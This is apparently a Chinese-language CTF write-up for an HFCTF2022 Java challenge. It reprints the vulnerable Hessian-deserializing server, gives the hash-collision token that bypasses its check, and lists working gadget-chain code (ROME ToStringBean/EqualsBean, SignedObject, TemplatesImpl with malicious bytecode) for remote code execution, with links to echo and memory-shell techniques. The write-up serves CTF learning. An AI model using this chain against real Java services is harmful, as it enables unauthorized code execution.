# README

## 前言

HFCTF2022的Java题，考察了hessian+rome的反序列化。



## wp

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctf.ezchain;

import com.caucho.hessian.io.Hessian2Input;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.Executors;

public class Index {
    public Index() {
    }

    public static void main(String[] args) throws Exception {
        System.out.println("server start");
        HttpServer server = HttpServer.create(new InetSocketAddress(8090), 0);
        server.createContext("/", new Index.MyHandler());
        server.setExecutor(Executors.newCachedThreadPool());
        server.start();
    }

    static class MyHandler implements HttpHandler {
        MyHandler() {
        }

        public void handle(HttpExchange t) throws IOException {
            String query = t.getRequestURI().getQuery();
            Map<String, String> queryMap = this.queryToMap(query);
            String response = "Welcome to HFCTF 2022";
            if (queryMap != null) {
                String token = (String)queryMap.get("token");
                String secret = "HFCTF2022";
                if (Objects.hashCode(token) == secret.hashCode() && !secret.equals(token)) {
                    InputStream is = t.getRequestBody();

                    try {
                        Hessian2Input input = new Hessian2Input(is);
                        input.readObject();
                    } catch (Exception var9) {
                        response = "oops! something is wrong";
                    }
                } else {
                    response = "your token is wrong";
                }
            }

            t.sendResponseHeaders(200, (long)response.length());
            OutputStream os = t.getResponseBody();
            os.write(response.getBytes());
            os.close();
        }

        public Map<String, String> queryToMap(String query) {
            if (query == null) {
                return null;
            } else {
                Map<String, String> result = new HashMap();
                String[] var3 = query.split("&");
                int var4 = var3.length;

                for(int var5 = 0; var5 < var4; ++var5) {
                    String param = var3[var5];
                    String[] entry = param.split("=");
                    if (entry.length > 1) {
                        result.put(entry[0], entry[1]);
                    } else {
                        result.put(entry[0], "");
                    }
                }

                return result;
            }
        }
    }
}

```

给了`rome-utils-1.7.0`的依赖。首先需要绕那个hashcode，Jiang宝爆破出来是`bfcb41d9`。

然后就是hessian+rome的反序列化了，因为环境不出网，所以JNDI注入的链子没法用。动态加载字节码的话会因为瞬态变量出问题。



这里学习一波`SignedObject#getObject`方法：

```java
    public Object getObject()
        throws IOException, ClassNotFoundException
    {
        // creating a stream pipe-line, from b to a
        ByteArrayInputStream b = new ByteArrayInputStream(this.content);
        ObjectInput a = new ObjectInputStream(b);
        Object obj = a.readObject();
        b.close();
        a.close();
        return obj;
    }
```

可以原生反序列化，所以构造一个二次反序列化的POC即可：

```java
        byte[] evilCode = SerializeUtil.getEvilCode();
        TemplatesImpl templates = new TemplatesImpl();
        SerializeUtil.setFieldValue(templates,"_bytecodes",new byte[][]{evilCode});
        SerializeUtil.setFieldValue(templates,"_name","f");
        //SerializeUtil.setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);
        EqualsBean equalsBean1 = new EqualsBean(ToStringBean.class, toStringBean1);
        ObjectBean objectBean1 = new ObjectBean(String.class,"f");
        HashMap evilMap1 = new HashMap();
        evilMap1.put(objectBean1,1);
        evilMap1.put(objectBean1,1);
        SerializeUtil.setFieldValue(objectBean1,"equalsBean",equalsBean1);
        //byte[] bytes = SerializeUtil.serialize(evilMap1);
        Signature signature = Signature.getInstance("DSA");
        KeyPairGenerator kg = KeyPairGenerator.getInstance("DSA");
        kg.initialize(1024);
        KeyPair kp = kg.genKeyPair();
        SignedObject signedObject = new SignedObject(evilMap1,kp.getPrivate(),signature);
        //SerializeUtil.setFieldValue(signedObject,"content",bytes);


        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);



        ObjectBean objectBean = new ObjectBean(String.class,"f");
        HashMap evilMap = new HashMap();
        evilMap.put(objectBean,1);
        evilMap.put(objectBean,1);
        SerializeUtil.setFieldValue(objectBean,"equalsBean",equalsBean);
        //byte[] serialize = SerializeUtil.serialize(evilMap);
        //SerializeUtil.unserialize(serialize);
        byte[] serialize = HessianUtil.serialize(evilMap);
        System.out.println(Base64.getEncoder().encodeToString(serialize));
        //HessianUtil.deserialize(serialize);
```

接下来的问题就是，那个恶意类的写了。说白了就是怎么回显了。

这里有2种办法，一种就是类似内存马的方法，一种就是Linux通用回显。

linux通用回显学习自Jiang宝：

https://github.com/bfengj/Java-Rce-Echo/blob/master/Linux/code/case2-Deprecated.jsp

但是buu的环境我没有打通，Jiang宝说他自己的环境打通了，可能是Buu的问题。

另外一种内存马的方式学习自Y4师傅了：

https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java-%E5%86%85%E5%AD%98%E9%A9%AC/#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83



具体明天再继续分析了，今天有点晚了。



